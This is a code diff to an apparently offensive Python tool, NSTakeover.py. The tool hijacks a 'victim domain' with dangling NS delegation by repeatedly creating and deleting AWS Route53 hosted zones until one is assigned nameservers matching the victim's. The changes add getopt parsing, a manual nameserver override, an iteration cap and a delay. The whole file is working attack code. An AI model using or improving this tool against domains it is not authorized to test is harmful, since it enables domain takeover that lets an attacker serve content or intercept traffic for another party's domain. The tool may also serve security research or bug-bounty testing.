@@ -1,3 +1,5 @@
+import getopt
+
 import route53
 import sys
 import time
@@ -7,6 +9,7 @@ import subprocess
 import json
 import ast
 import whois
+
 
 accessKey=""
 secretKey=""
@@ -59,35 +62,71 @@ def myPrint(text, type):
 zones_to_keep = []
 forceDelete = False
 
-if (len(sys.argv)<7):
+def usage():
 	myPrint("Please provide the required arguments to initiate scanning.", "ERROR")
 	print ""
-	myPrint("Usage: python NSTakeover.py -d domain -a accessKey -s secretKey","ERROR")
-	myPrint("Please try again!!", "ERROR") 
+	myPrint("Usage: python NSTakeover.py -d domain -a accessKey -s secretKey -x dnsOverride", "ERROR")
+	myPrint("Please try again!!", "ERROR")
 	print ""
-	exit(1);
-if (sys.argv[1]=="-d" or sys.argv[1]=="--domain"):
-	victimDomain=sys.argv[2]
-if (sys.argv[3]=="-a" or sys.argv[3]=="--accessId"):
-	accessKey=sys.argv[4]
-if (sys.argv[5]=="-s" or sys.argv[5]=="--secretKey"):
-	secretKey=sys.argv[6]
-if len(sys.argv) >= 8:
-	if (sys.argv[7]=="-f" or sys.argv[7]=="--forceDelete"):
-		forceDelete =  True
+	sys.exit(1)
+
 try:
-	nsRecords_method = None
-	nsRecords = []
-	try:
-		nsRecords_method = "whois"
-		nsRecords = dns.resolver.query(victimDomain, 'NS')
-	except:
-		nsRecords_method = "ns resolver"
-		nsRecords = list(whois.query(victimDomain).name_servers)
+	opts, args = getopt.getopt(sys.argv[1:], "hd:a:s:fx:", [
+		"help",
+		"domain=",
+		"accessId=",
+		"secretKey=",
+		"forceDelete",
+		"nsOverride"
+	])
+except getopt.GetoptError as err:
+	# print help information and exit:
+	print str(err)  # will print something like "option -a not recognized"
+	usage()
+	sys.exit(2)
 
-	myPrint("Detected NS records using "+nsRecords_method+": "+str(nsRecords), "INFO")
+nsOverride = []
+output = None
+verbose = False
+for o, a in opts:
+	if o in ("-h", "--help"):
+		usage()
+	elif o in ("-d", "--domain"):
+		myPrint("victim domain selected: " + a, "INFO")
+		victimDomain = a
+	elif o in ("-a", "--accessId"):
+		accessKey = a
+	elif o in ("-s", "--secretKey"):
+		secretKey = a
+	elif o in ("-f", "--forceDelete"):
+		forceDelete = True
+	elif o in ("-x", "--nsOverride"):
+		nsOverride.append(a)
+		#myPrint("nsOverride selected: "+str(nsOverride), "INFO")
+	else:
+		assert False, "unhandled option"
 
-except Exception as e:
+if not victimDomain or not accessKey or not secretKey:
+	usage()
+
+try:
+	if not nsOverride:
+		nsRecords_method = None
+
+
+		nsRecords = []
+		try:
+			nsRecords_method = "whois"
+			nsRecords = list(whois.query(victimDomain).name_servers)
+		except:
+			nsRecords_method = "ns resolver"
+			nsRecords = dns.resolver.query(victimDomain, 'NS')
+	else:
+		nsRecords = nsOverride
+		nsRecords_method = "manual override"
+
+	#myPrint("Detected NS records using "+nsRecords_method+": "+str(nsRecords), "INFO")
+except:
 	myPrint("Unable to fetch NS records for "+victimDomain+"\nPlease check the domain name and try again.","ERROR")
 	exit(1)
 isInt= isinstance(nsRecords,int)
@@ -103,6 +142,8 @@ for index in range(len(targetNS)):
 #strip trailing .
 		targetNS[index]=targetNS[index].strip(".")
 
+
+myPrint("Target NS: "+str(targetNS), "INFO")
 conn = route53.connect(
     aws_access_key_id=accessKey,
     aws_secret_access_key=secretKey,
@@ -113,14 +154,14 @@ successful_zone = []
 counter=0
 try:
 
-	while True:
+	while counter < 10000:
 		counter=counter+1
 		myPrint("Iteration Count: "+str(counter),"INFO_WS")
 		try: 
 			new_zone=0
 			new_zone, change_info = conn.create_hosted_zone(
 			# in honor of bagipro, we love your reports, we hope you never stop researching and participating in bug bounty
-		    victimDomain, comment='zaheck'
+		    victimDomain, comment='friyin'
 			)
 			hosted_zone_id = new_zone.__dict__["id"]
 			created_zones.append(hosted_zone_id)
@@ -134,6 +175,7 @@ try:
 			if(len(intersection)==0):
 				myPrint("No common NS found, deleting new zone","ERROR")
 				print ""
+				time.sleep(0.5)
 				new_zone.delete()
 			else:
 				myPrint("Successful attempt after "+str(counter)+" iterations.","SECURE")
